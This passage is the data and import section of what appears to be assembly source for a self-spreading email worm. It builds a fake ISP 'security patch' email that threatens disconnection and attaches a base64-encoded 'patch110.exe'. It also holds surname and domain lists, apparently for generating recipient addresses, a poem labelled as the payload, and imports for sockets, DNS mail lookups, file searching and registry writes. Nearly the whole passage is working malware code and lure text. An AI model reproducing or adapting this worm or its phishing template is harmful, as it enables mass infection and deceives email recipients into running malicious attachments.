                        DB 'your computer and us from attacks. All ', 0
    szEmailPart11       DB ' customers MUST have this patch installed by <b>', 0
    szEmailPart12       DB '</b>. Failure to do so will result in disconnection of this Internet service. If you ' 
                        DB 'require assistence or have any questions contact us at <a href = "mailto:info@', 0
    szEmailPart13       DB '">info@', 0
    szEmailPart14       DB '</a>.<p>', CRLF
                        DB '</font>', CRLF
                        DB '<center><font color = "555555">&copy; ', 0
    szEmailPart15       DB ' ', 0
    szEmailPart16       DB ' Inc.</font></center>', CRLF
                        DB '</td>', CRLF
                        DB '</tr>', CRLF
                        DB '</table>', CRLF
                        DB '</td>', CRLF
                        DB '</tr>', CRLF
                        DB '</table>', CRLF
                        DB '</body>', CRLF
                        DB '</html>', CRLF
                        DB CRLF
                        DB '--Boundary.11111111.11111111', CRLF
                        DB 'Content-Type: application/x-msdownload; name="patch110.exe"', CRLF
                        DB 'Content-Transfer-Encoding: base64', CRLF
                        DB 'Content-Description: patch110.exe', CRLF
                        DB 'Content-Disposition: attachment; filename="patch110.exe"', CRLF
                        DB CRLF
                        DB 0
    szEmailPart17       DB CRLF
                        DB '--Boundary.11111111.11111111--', CRLF
                        DB CRLF
                        DB '.', CRLF
                        DB 0

    lastnames DB  'SMITH',0,'JOHNSON',0,'WILLIAMS',0,'JONES',0,'BROWN',0,'DAVIS',0,'MILLER',0,'WILSON',0
              DB  'MOORE',0,'TAYLOR',0,'ANDERSON',0,'THOMAS',0,'JACKSON',0,'WHITE',0,'HARRIS',0,'MARTIN',0
              DB  'THOMPSON',0,'GARCIA',0,'MARTINEZ',0,'ROBINSON',0,'CLARK',0,'RODRIGUEZ',0,'LEWIS',0
              DB  'LEE',0,'WALKER',0,'HALL',0,'ALLEN',0,'YOUNG',0,'HERNANDEZ',0,'KING',0,'WRIGHT',0
              DB  'LOPEZ',0,'HILL',0,'SCOTT',0,'GREEN',0,'ADAMS',0,'BAKER',0,'GONZALEZ',0,'NELSON',0
              DB  'CARTER',0,'MITCHELL',0,'PEREZ',0,'ROBERTS',0,'TURNER',0,'PHILLIPS',0,'CAMPBELL',0
              DB  'PARKER',0,'EVANS',0,'EDWARDS',0,'COLLINS',0,'STEWART',0,'SANCHEZ',0,'MORRIS',0
              DB  'ROGERS',0,'REED',0,'COOK',0,'MORGAN',0,'BELL',0,'MURPHY',0,'BAILEY',0,'RIVERA',0
              DB  'COOPER',0,'RICHARDSON',0,'COX',0,'HOWARD',0,'WARD',0,'TORRES',0,'PETERSON',0,'GRAY',0
              DB  'RAMIREZ',0,'JAMES',0,'WATSON',0,'BROOKS',0,'KELLY',0,'SANDERS',0,'PRICE',0,'BENNETT',0
              DB  'WOOD',0,'BARNES',0,'ROSS',0,'HENDERSON',0,'COLEMAN',0,'JENKINS',0,'PERRY',0,'POWELL',0
              DB  'LONG',0,'PATTERSON',0,'HUGHES',0,'FLORES',0,'WASHINGTON',0,'BUTLER',0,'SIMMONS',0
              DB  'FOSTER',0,'GONZALES',0,'BRYANT',0,'ALEXANDER',0,'RUSSELL',0,'GRIFFIN',0,'DIAZ',0
              DB  'HAYES',0,'MYERS',0,'FORD',0,'HAMILTON',0,'GRAHAM',0,'SULLIVAN',0,'WALLACE',0,'WOODS',0
              DB  'COLE',0,'WEST',0,'JORDAN',0,'OWENS',0,'REYNOLDS',0,'FISHER',0,'ELLIS',0,'HARRISON',0
              DB  'GIBSON',0,'MCDONALD',0,'CRUZ',0,'MARSHALL',0,'ORTIZ',0,'GOMEZ',0,'MURRAY',0,'FREEMAN',0
              DB  'WELLS',0,'WEBB',0,'SIMPSON',0,'STEVENS',0,'TUCKER',0,'PORTER',0,'HUNTER',0,'HICKS',0
              DB  'CRAWFORD',0,'HENRY',0,'BOYD',0,'MASON',0,'MORALES',0,'KENNEDY',0,'WARREN',0,'DIXON',0
              DB  'RAMOS',0,'REYES',0,'BURNS',0,'GORDON',0,'SHAW',0,'HOLMES',0,'RICE',0,'ROBERTSON',0
              DB  'HUNT',0,'BLACK',0,'DANIELS',0,'PALMER',0,'MILLS',0,'NICHOLS',0,'GRANT',0,'KNIGHT',0
              DB  'FERGUSON',0,'ROSE',0,'STONE',0,'HAWKINS',0,'DUNN',0,'PERKINS',0,'HUDSON',0,'SPENCER',0
              DB  'GARDNER',0,'STEPHENS',0,'PAYNE',0,'PIERCE',0,'BERRY',0,'MATTHEWS',0,'ARNOLD',0
              DB  'WAGNER',0,'WILLIS',0,'RAY',0,'WATKINS',0,'OLSON',0,'CARROLL',0,'DUNCAN',0,'SNYDER',0
              DB  'HART',0,'CUNNINGHAM',0,'BRADLEY',0,'LANE',0,'ANDREWS',0,'RUIZ',0,'HARPER',0,'FOX',0
              DB  'RILEY',0,'ARMSTRONG',0,'CARPENTER',0,'WEAVER',0,'GREENE',0,'LAWRENCE',0,'ELLIOTT',0
              DB  'CHAVEZ',0,'SIMS',0,'AUSTIN',0,'PETERS',0,'KELLEY',0,'FRANKLIN',0,'LAWSON',0,'FIELDS',0
              DB  'GUTIERREZ',0,'RYAN',0,'SCHMIDT',0,'CARR',0,'VASQUEZ',0,'CASTILLO',0,'WHEELER',0
              DB  'CHAPMAN',0,'OLIVER',0,'MONTGOMERY',0,'RICHARDS',0,'WILLIAMSON',0,'JOHNSTON',0,'BANKS',0
              DB  'MEYER',0,'BISHOP',0,'MCCOY',0,'HOWELL',0,'ALVAREZ',0,'MORRISON',0,'HANSEN',0
              DB  'FERNANDEZ',0,'GARZA',0,'HARVEY',0,'LITTLE',0,'BURTON',0,'STANLEY',0,'NGUYEN',0
              DB  'GEORGE',0,'JACOBS',0,'REID',0,'KIM',0,'FULLER',0,'LYNCH',0,'DEAN',0,'GILBERT',0
              DB  'GARRETT',0,'ROMERO',0,'WELCH',0,'LARSON',0,'FRAZIER',0,'BURKE',0,'HANSON',0,'DAY',0
              DB  'MENDOZA',0,'MORENO',0,'BOWMAN',0,'MEDINA',0,'FOWLER',0,'BREWER',0,'HOFFMAN',0
              DB  'CARLSON',0,'SILVA',0,'PEARSON',0,'HOLLAND',0,'DOUGLAS',0,'FLEMING',0,'JENSEN',0
              DB  'VARGAS',0,'BYRD',0,'DAVIDSON',0,'HOPKINS',0,'MAY',0,'TERRY',0,'HERRERA',0,'WADE',0
              DB  'SOTO',0,'WALTERS',0,'CURTIS',0,'NEAL',0,'CALDWELL',0,'LOWE',0,'JENNINGS',0,'BARNETT',0
              DB  'GRAVES',0,'JIMENEZ',0,'HORTON',0,'SHELTON',0,'BARRETT',0,'OBRIEN',0,'CASTRO',0
              DB  'SUTTON',0,'GREGORY',0,'MCKINNEY',0,'LUCAS',0,'MILES',0,'CRAIG',0,'RODRIQUEZ',0
              DB  'CHAMBERS',0,'HOLT',0,'LAMBERT',0,'FLETCHER',0,'WATTS',0,'BATES',0,'HALE',0,'RHODES',0
              DB  'PENA',0,'BECK',0,'NEWMAN',0,'HAYNES',0,'MCDANIEL',0,'MENDEZ',0,'BUSH',0,'VAUGHN',0
              DB  'PARKS',0,'DAWSON',0,'SANTIAGO',0,'NORRIS',0,'HARDY',0,'LOVE',0,'STEELE',0,'CURRY',0
              DB  'POWERS',0,'SCHULTZ',0,'BARKER',0,'GUZMAN',0,'PAGE',0,'MUNOZ',0,'BALL',0,'KELLER',0
              DB  'CHANDLER',0,'WEBER',0,'LEONARD',0,'WALSH',0,'LYONS',0,'RAMSEY',0,'WOLFE',0
              DB  'SCHNEIDER',0,'MULLINS',0,'BENSON',0,'SHARP',0,'BOWEN',0,'DANIEL',0,'BARBER',0
              DB  'CUMMINGS',0,'HINES',0,'BALDWIN',0,'GRIFFITH',0,'VALDEZ',0,'HUBBARD',0,'SALAZAR',0
              DB  'REEVES',0,'WARNER',0,'STEVENSON',0,'BURGESS',0,'SANTOS',0,'TATE',0,'CROSS',0,'GARNER',0
              DB  'MANN',0,'MACK',0,'MOSS',0,'THORNTON',0,'DENNIS',0,'MCGEE',0,'FARMER',0,'DELGADO',0
              DB  'AGUILAR',0,'VEGA',0,'GLOVER',0,'MANNING',0,'COHEN',0,'HARMON',0,'RODGERS',0,'ROBBINS',0
              DB  'NEWTON',0,'TODD',0,'BLAIR',0,'HIGGINS',0,'INGRAM',0,'REESE',0,'CANNON',0,'STRICKLAND',0
              DB  'TOWNSEND',0,'POTTER',0,'GOODWIN',0,'WALTON',0,'ROWE',0,'HAMPTON',0,'ORTEGA',0
              DB  'PATTON',0,'SWANSON',0,'JOSEPH',0,'FRANCIS',0,'GOODMAN',0,'MALDONADO',0,'YATES',0
              DB  'BECKER',0,'ERICKSON',0,'HODGES',0,'RIOS',0,'CONNER',0,'ADKINS',0,'WEBSTER',0
              DB  'NORMAN',0,'MALONE',0,'HAMMOND',0,'FLOWERS',0,'COBB',0,'MOODY',0,'QUINN',0,'BLAKE',0
              DB  'MAXWELL',0,'POPE',0,'FLOYD',0,'OSBORNE',0,'PAUL',0,'MCCARTHY',0,'GUERRERO',0,'LINDSEY',0
              DB  'ESTRADA',0,'SANDOVAL',0,'GIBBS',0,'TYLER',0,'GROSS',0,'FITZGERALD',0,'STOKES',0
              DB  'DOYLE',0,'SHERMAN',0,'SAUNDERS',0,'WISE',0,'COLON',0,'GILL',0,'ALVARADO',0,'GREER',0
              DB  'PADILLA',0,'SIMON',0,'WATERS',0,'NUNEZ',0,'BALLARD',0,'SCHWARTZ',0,'MCBRIDE',0
              DB  'HOUSTON',0,'CHRISTENSEN',0,'KLEIN',0,'PRATT',0,'BRIGGS',0,'PARSONS',0,'MCLAUGHLIN',0
              DB  'ZIMMERMAN',0,'FRENCH',0,'BUCHANAN',0,'MORAN',0,'COPELAND',0,'ROY',0,'PITTMAN',0
              DB  'BRADY',0,'MCCORMICK',0,'HOLLOWAY',0,'BROCK',0,'POOLE',0,'FRANK',0,'LOGAN',0,'OWEN',0
              DB  'BASS',0,'MARSH',0,'DRAKE',0,'WONG',0,'JEFFERSON',0,'PARK',0,'MORTON',0,'ABBOTT',0
              DB  'SPARKS',0,'PATRICK',0,'NORTON',0,'HUFF',0,'CLAYTON',0,'MASSEY',0,'LLOYD',0
              DB  'FIGUEROA',0,'CARSON',0,'BOWERS',0,'ROBERSON',0,'BARTON',0,'TRAN',0,'LAMB',0
              DB  'HARRINGTON',0,'CASEY',0,'BOONE',0,'CORTEZ',0,'CLARKE',0,'MATHIS',0,'SINGLETON',0
              DB  'WILKINS',0,'CAIN',0,'BRYAN',0,'UNDERWOOD',0,'HOGAN',0,'MCKENZIE',0,'COLLIER',0,'LUNA',0
              DB  'PHELPS',0,'MCGUIRE',0,'ALLISON',0,'BRIDGES',0,'WILKERSON',0,'NASH',0,'SUMMERS',0
              DB  'ATKINS',0,'WILCOX',0,'PITTS',0,'CONLEY',0,'MARQUEZ',0,'BURNETT',0,'RICHARD',0
              DB  'COCHRAN',0,'CHASE',0,'DAVENPORT',0,'HOOD',0,'GATES',0,'CLAY',0,'AYALA',0,'SAWYER',0
              DB  'ROMAN',0,'VAZQUEZ',0,'DICKERSON',0,'HODGE',0,'ACOSTA',0,'FLYNN',0,'ESPINOZA',0
              DB  'NICHOLSON',0,'MONROE',0,'WOLF',0,'MORROW',0,'KIRK',0,'RANDALL',0,'ANTHONY',0
              DB  'WHITAKER',0,'OCONNOR',0,'SKINNER',0,'WARE',0,'MOLINA',0,'KIRBY',0,'HUFFMAN',0
              DB  'BRADFORD',0,'CHARLES',0,'GILMORE',0,'DOMINGUEZ',0,'ONEAL',0,'BRUCE',0,'LANG',0
              DB  'COMBS',0,'KRAMER',0,'HEATH',0,'HANCOCK',0,'GALLAGHER',0,'GAINES',0,'SHAFFER',0
              DB  'SHORT',0,'WIGGINS',0,'MATHEWS',0,'MCCLAIN',0,'FISCHER',0,'WALL',0,'SMALL',0,'MELTON',0
              DB  'HENSLEY',0,'BOND',0,'DYER',0,'CAMERON',0,'GRIMES',0,'CONTRERAS',0,'CHRISTIAN',0
              DB  'WYATT',0,'BAXTER',0,'SNOW',0,'MOSLEY',0,'SHEPHERD',0,'LARSEN',0,'HOOVER',0,'BEASLEY',0
              DB  'GLENN',0,'PETERSEN',0,'WHITEHEAD',0,'MEYERS',0,'KEITH',0,'GARRISON',0,'VINCENT',0
              DB  'SHIELDS',0,'HORN',0,'SAVAGE',0,'OLSEN',0,'SCHROEDER',0,'HARTMAN',0,'WOODARD',0
              DB  'MUELLER',0,'KEMP',0,'DELEON',0,'BOOTH',0,'PATEL',0,'CALHOUN',0,'WILEY',0,'EATON',0
              DB  'CLINE',0,'NAVARRO',0,'HARRELL',0,'LESTER',0,'HUMPHREY',0,'PARRISH',0,'DURAN',0
              DB  'HUTCHINSON',0,'HESS',0,'DORSEY',0,'BULLOCK',0,'ROBLES',0,'BEARD',0,'DALTON',0
              DB  'AVILA',0,'VANCE',0,'RICH',0,'BLACKWELL',0,'YORK',0,'JOHNS',0,'BLANKENSHIP',0
              DB  'TREVINO',0,'SALINAS',0,'CAMPOS',0,'PRUITT',0,'MOSES',0,'CALLAHAN',0,'GOLDEN',0
              DB  'MONTOYA',0,'HARDIN',0,'GUERRA',0,'MCDOWELL',0,'CAREY',0,'STAFFORD',0,'GALLEGOS',0
              DB  'HENSON',0,'WILKINSON',0,'BOOKER',0,'MERRITT',0,'MIRANDA',0,'ATKINSON',0,'ORR',0
              DB  'DECKER',0,'HOBBS',0,'PRESTON',0,'TANNER',0,'KNOX',0,'PACHECO',0,'STEPHENSON',0
              DB  'GLASS',0,'ROJAS',0,'SERRANO',0,'MARKS',0,'HICKMAN',0,'ENGLISH',0,'SWEENEY',0
              DB  'STRONG',0,'PRINCE',0,'MCCLURE',0,'CONWAY',0,'WALTER',0,'ROTH',0,'MAYNARD',0,'FARRELL',0
              DB  'LOWERY',0,'HURST',0,'NIXON',0,'WEISS',0,'TRUJILLO',0,'ELLISON',0,'SLOAN',0,'JUAREZ',0
              DB  'WINTERS',0,'MCLEAN',0,'RANDOLPH',0,'LEON',0,'BOYER',0,'VILLARREAL',0,'MCCALL',0
              DB  'GENTRY',0,'CARRILLO',0,'KENT',0,'AYERS',0,'LARA',0,'SHANNON',0,'SEXTON',0,'PACE',0
              DB  'HULL',0,'LEBLANC',0,'BROWNING',0,'VELASQUEZ',0,'LEACH',0,'CHANG',0,'HOUSE',0,'SELLERS',0
              DB  'HERRING',0,'NOBLE',0,'FOLEY',0,'BARTLETT',0,'MERCADO',0,'LANDRY',0,'DURHAM',0,'WALLS',0
              DB  'BARR',0,'MCKEE',0,'BAUER',0,'RIVERS',0,'EVERETT',0,'BRADSHAW',0,'PUGH',0,'VELEZ',0
              DB  'RUSH',0,'ESTES',0,'DODSON',0,'MORSE',0,'SHEPPARD',0,'WEEKS',0,'CAMACHO',0,'BEAN',0
              DB  'BARRON',0,'LIVINGSTON',0,'MIDDLETON',0,'SPEARS',0,'BRANCH',0,'BLEVINS',0,'CHEN',0
              DB  'KERR',0,'MCCONNELL',0,'HATFIELD',0,'HARDING',0,'ASHLEY',0,'SOLIS',0,'HERMAN',0,'FROST',0
              DB  'GILES',0,'BLACKBURN',0,'WILLIAM',0,'PENNINGTON',0,'WOODWARD',0,'FINLEY',0,'MCINTOSH',0
              DB  'KOCH',0,'BEST',0,'SOLOMON',0,'MCCULLOUGH',0,'DUDLEY',0,'NOLAN',0,'BLANCHARD',0,'RIVAS',0
              DB  'BRENNAN',0,'MEJIA',0,'KANE',0,'BENTON',0,'JOYCE',0,'BUCKLEY',0,'HALEY',0,'VALENTINE',0
              DB  'MADDOX',0,'RUSSO',0,'MCKNIGHT',0,'BUCK',0,'MOON',0,'MCMILLAN',0,'CROSBY',0,'BERG',0
              DB  'DOTSON',0,'MAYS',0,'ROACH',0,'CHURCH',0,'CHAN',0,'RICHMOND',0,'MEADOWS',0,'FAULKNER',0
              DB  'ONEILL',0,'KNAPP',0,'KLINE',0,'BARRY',0,'OCHOA',0,'JACOBSON',0,'GAY',0,'AVERY',0
              DB  'HENDRICKS',0,'HORNE',0,'SHEPARD',0,'HEBERT',0,'CHERRY',0,'CARDENAS',0,'MCINTYRE',0
              DB  'WHITNEY',0,'WALLER',0,'HOLMAN',0,'DONALDSON',0,'CANTU',0,'TERRELL',0,'MORIN',0
              DB  'GILLESPIE',0,'FUENTES',0,'TILLMAN',0,'SANFORD',0,'BENTLEY',0,'PECK',0,'KEY',0,'SALAS',0
              DB  'ROLLINS',0,'GAMBLE',0,'DICKSON',0,'BATTLE',0,'SANTANA',0,'CABRERA',0,'CERVANTES',0
              DB  'HOWE',0,'HINTON',0,'HURLEY',0,'SPENCE',0,'ZAMORA',0,'YANG',0,'MCNEIL',0,'SUAREZ',0
              DB  'CASE',0,'PETTY',0,'GOULD',0,'MCFARLAND',0,'SAMPSON',0,'CARVER',0,'BRAY',0,'ROSARIO',0
              DB  'MACDONALD',0,'STOUT',0,'HESTER',0,'MELENDEZ',0,'DILLON',0,'FARLEY',0,'HOPPER',0
              DB  'GALLOWAY',0,'POTTS',0,'BERNARD',0,'JOYNER',0,'STEIN',0,'AGUIRRE',0,'OSBORN',0,'MERCER',0
              DB  'BENDER',0,'FRANCO',0,'ROWLAND',0,'SYKES',0,'BENJAMIN',0,'TRAVIS',0,'PICKETT',0,'CRANE',0
              DB  'SEARS',0,'MAYO',0,'DUNLAP',0,'HAYDEN',0,'WILDER',0,'MCKAY',0,'COFFEY',0,'MCCARTY',0
              DB  'EWING',0,'COOLEY',0,'VAUGHAN',0,'BONNER',0,'COTTON',0,'HOLDER',0,'STARK',0,'FERRELL',0
              DB  'CANTRELL',0,'FULTON',0,'LYNN',0,'LOTT',0,'CALDERON',0,'ROSA',0,'POLLARD',0,'HOOPER',0
              DB  'BURCH',0,'MULLEN',0,'FRY',0,'RIDDLE',0,'LEVY',0,'DAVID',0,'DUKE',0,'ODONNELL',0,'GUY',0
              DB  'MICHAEL',0,'BRITT',0,'FREDERICK',0,'DAUGHERTY',0,'BERGER',0,'DILLARD',0,'ALSTON',0
              DB  'JARVIS',0,'FRYE',0,'RIGGS',0,'CHANEY',0,'ODOM',0,'DUFFY',0,'FITZPATRICK',0,'VALENZUELA',0
              DB  'MERRILL',0,'MAYER',0,'ALFORD',0,'MCPHERSON',0,'ACEVEDO',0,'DONOVAN',0,'BARRERA',0
              DB  'ALBERT',0,'COTE',0,'REILLY',0,'COMPTON',0,'RAYMOND',0,'MOONEY',0,'MCGOWAN',0,'CRAFT',0
              DB  'CLEVELAND',0,'CLEMONS',0,'WYNN',0,'NIELSEN',0,'BAIRD',0,'STANTON',0,'SNIDER',0
              DB  'ROSALES',0,'BRIGHT',0,'WITT',0,'STUART',0,'HAYS',0,'HOLDEN',0,'RUTLEDGE',0,'KINNEY',0
              DB  'CLEMENTS',0,'CASTANEDA',0,'SLATER',0,'HAHN',0,'EMERSON',0,'CONRAD',0,'BURKS',0
              DB  'DELANEY',0,'PATE',0,'LANCASTER',0,'SWEET',0,'JUSTICE',0,'TYSON',0,'SHARPE',0
              DB  'WHITFIELD',0,'TALLEY',0,'MACIAS',0,'IRWIN',0,'BURRIS',0,'RATLIFF',0,'MCCRAY',0,'MADDEN',0
              DB  'KAUFMAN',0,'BEACH',0,'GOFF',0,'CASH',0,'BOLTON',0,'MCFADDEN',0,'LEVINE',0,'GOOD',0
              DB  'BYERS',0,'KIRKLAND',0,'KIDD',0,'WORKMAN',0,'CARNEY',0,'DALE',0,'MCLEOD',0,'HOLCOMB',0
              DB  'ENGLAND',0,'FINCH',0,'HEAD',0,'BURT',0,'HENDRIX',0,'SOSA',0,'HANEY',0,'FRANKS',0
              DB  'SARGENT',0,'NIEVES',0,'DOWNS',0,'RASMUSSEN',0,'BIRD',0,'HEWITT',0,'LINDSAY',0,'LE',0
              DB  'FOREMAN',0,'VALENCIA',0,'ONEIL',0,'DELACRUZ',0,'VINSON',0,'DEJESUS',0,'HYDE',0
              DB  'FORBES',0,'GILLIAM',0,'GUTHRIE',0,'WOOTEN',0,'HUBER',0,'BARLOW',0,'BOYLE',0,'MCMAHON',0
              DB  'BUCKNER',0,'ROCHA',0,'PUCKETT',0,'LANGLEY',0,'KNOWLES',0,'COOKE',0,'VELAZQUEZ',0
              DB  'WHITLEY',0,'NOEL',0,'VANG',0,'SHEA',0,'ROUSE',0,'HARTLEY',0,'MAYFIELD',0,'ELDER',0
              DB  'RANKIN',0,'HANNA',0,'COWAN',0,'LUCERO',0,'ARROYO',0,'SLAUGHTER',0,'HAAS',0,'OCONNELL',0
              DB  'MINOR',0,'KENDRICK',0,'SHIRLEY',0,'KENDALL',0,'BOUCHER',0,'ARCHER',0,'BOGGS',0
              DB  'ODELL',0,'DOUGHERTY',0, 'ANDERSEN',0,'NEWELL',0

    ; a list of top level domains
    topDomains DB 'com', 0, 'edu', 0, 'sa',  0, 'gv',  0, 'ac',  0, 'co',  0
               DB 'at',  0, 'be',  0, 'bio', 0, 'br',  0, 'eti', 0, 'jor', 0                 
               DB 'org', 0, 'tur', 0, 'nb',  0, 'yk',  0, 'bj',  0, 'hl',  0
               DB 'hi',  0, 'nx',  0, 'cn',  0, 'ca',  0, 'dk',  0, 'gov', 0
               DB 'ec',  0, 'il',  0, 'in',  0, 'jp',  0, 'nm',  0, 'kr',  0 
               DB 'mm',  0, 'mx',  0, 'pl',  0, 'ro',  0, 'ru',  0, 'sg',  0
               DB 'th',  0, 'tr',  0, 'tw',  0, 'mi',  0, 'ac',  0, 'za',  0
               DB 'nom', 0, 'ie',  0, 'jp',  0, 'mil', 0, 'se',  0, 'or',  0
               DB 'cng', 0, 'lel', 0, 'ppg', 0, 'tv',  0, 'nf',  0, 'cc',  0
               DB 'sh',  0, 'js',  0, 'sc',  0, 'xj',  0, 'fr',  0, 'go',  0
               DB 'kr',  0, 'www', 0, 'sk',  0, 'uk',  0, 'alt', 0, 'ua',  0
               DB 'hk',  0, 'gr',  0, 'cl',  0, 'br',  0, 'se',  0, 'cnt', 0
               DB 'fot', 0, 'med', 0, 'pro', 0, 'vet', 0, 'ns',  0, 'tj',  0
               DB 'zj',  0, 'gz',  0, 'tm',  0, 're',  0, 'k12', 0, 'biz', 0
               DB 'by',  0, 'us',  0, 'af',  0, 'asn', 0, 'adm', 0, 'fst', 0
               DB 'psc', 0, 'zlg', 0, 'nt',  0, 'cq',  0, 'ah',  0, 'yn',  0
               DB 'ne',  0, 'pt',  0, 'rec', 0, 'tc',  0, 'wa',  0, 'ad',  0
               DB 'eu',  0, 'uy',  0, 'am',  0, 'au',  0, 'adv', 0, 'ecn', 0
               DB 'g12', 0, 'psi', 0, 'on',  0, 'he',  0, 'hb',  0, 'xz',  0
               DB 'mo',  0, 'res', 0, 'lt',  0, 'nl',  0, 'tf',  0, 'lv',  0
               DB 'itv', 0, 'hu',  0, 'as',  0, 'eng', 0, 'ab',  0, 'pe',  0
               DB 'hn',  0, 'sn',  0, 'cx',  0, 'is',  0, 'lu',  0, 'ms',  0
               DB 'no',  0, 'to',  0, 'gb',  0, 'plc', 0, 'arq', 0, 'esp', 0
               DB 'ind', 0, 'ntr', 0, 'slg', 0, 'bc',  0, 'qc',  0, 'ln',  0
               DB 'gd',  0, 'gs',  0, 'cz',  0, 'fin', 0, 'gf',  0, 'mc',  0
               DB 'nu',  0, 'bbs', 0, 'kz',  0, 'tk',  0, 'bz',  0, 'me',  0
               DB 'art', 0, 'etc', 0, 'inf', 0, 'odo', 0, 'tmp', 0, 'mb',  0
               DB 'jl',  0, 'gx',  0, 'qh',  0, 'de',  0, 'vg',  0, 'ngo', 0
               DB 'ch',  0, 'cd',  0, 'es',  0
               DB 'firm', 0, 'info', 0, 'aero', 0, 'ernet', 0, 'school', 0
               DB 'asso', 0, 'presse', 0, 'muni', 0, 'store', 0, 'name', 0
               DB '$'

    ; pay load
    szTitle        DB "On Seeing the Elgin Marbles for the First Time.", 0
    szElginMarbles DB "My spirit is too weak--mortality", CRLF 
                   DB "Weighs heavily on me like unwilling sleep,", CRLF 
                   DB "And each imagin'd pinnacle and steep", CRLF 
                   DB "Of godlike hardship, tells me I must die", CRLF 
                   DB "Like a sick Eagle looking at the sky.", CRLF 
                   DB "Yet 'tis a gentle luxury to weep", CRLF 
                   DB "That I have not the cloudy winds to keep,", CRLF 
                   DB "Fresh for the opening of the morning's eye.", CRLF 
                   DB "Such dim-conceived glories of the brain", CRLF 
                   DB "Bring round the heart an undescribable feud;", CRLF 
                   DB "So do these wonders a most dizzy pain,", CRLF 
                   DB "That mingles Grecian grandeur with the rude", CRLF 
                   DB "Wasting of old Time--with a billowy main--", CRLF 
                   DB "A sun--a shadow of a magnitude.", CRLF
                   DB CRLF
                   DB "-- John Keats (1796-1821)", CRLF              
                   DB 0

;-------------------------------------------------------------------------------------------------;
; Import Section                                                                                  ;
;-------------------------------------------------------------------------------------------------;
    
    ImportTable API_Imports_9x
        
        ImportDll Kernel32      
            ImportFunction ExitProcess
            ImportFunction CreateFileA
            ImportFunction ReadFile
            ImportFunction SetFilePointer
            ImportFunction WriteFile
            ImportFunction CloseHandle
            ImportFunction CreateThread
            ImportFunction GetCurrentThread
            ImportFunction GetExitCodeThread
            ImportFunction lstrcpyA
            ImportFunction lstrcatA
            ImportFunction lstrlenA
            ImportFunction lstrcmpA
            ImportFunction RtlZeroMemory
            ImportFunction RtlMoveMemory
            ImportFunction ExitThread
            ImportFunction GlobalAlloc
            ImportFunction GlobalFree
            ImportFunction GetDateFormatA
            ImportFunction GetSystemTime
            ImportFunction GetModuleFileNameA
            ImportFunction GetVersion
            ImportFunction GetFileSize
            ImportFunction GetDriveTypeA
            ImportFunction SetCurrentDirectoryA
            ImportFunction GetCurrentDirectoryA
            ImportFunction FindFirstFileA
            ImportFunction FindNextFileA
            ImportFunction FindClose
            ImportFunction GetCommandLineA
            ImportFunction GetTickCount
            ImportFunction GetSystemDirectoryA
        EndImport
 
        ImportDll User32
            ImportFunction MessageBoxA
            ImportFunction CharUpperA
        EndImport

        ImportDll Wsock32
            ImportFunction htons
            ImportFunction connect
            ImportFunction socket
            ImportFunction gethostname
            ImportFunction gethostbyname
            ImportFunction inet_ntoa
            ImportFunction WSAStartup
            ImportFunction WSACleanup
            ImportFunction recv
            ImportFunction send
            ImportFunction setsockopt
            ImportFunction inet_addr
            ImportFunction closesocket
        EndImport

        ImportDll Advapi32
            ImportFunction RegOpenKeyA
            ImportFunction RegSetValueExA
            ImportFunction RegCloseKey                   
        EndImport 

    EndImportTable        

    ImportTable API_Imports_2k    

        ImportDll Dnsapi
            ImportFunction DnsQuery_A
            ImportFunction DnsRecordListFree
        EndImport

        ImportDll Wininet
            ImportFunction InternetGetConnectedState
            ImportFunction InternetOpenA
            ImportFunction InternetCloseHandle
            ImportFunction InternetOpenUrlA 
            ImportFunction InternetReadFile
        EndImport

    EndImportTable
                
    CODE_SIZE         EQU ($ - offset main)
     
    End     main   
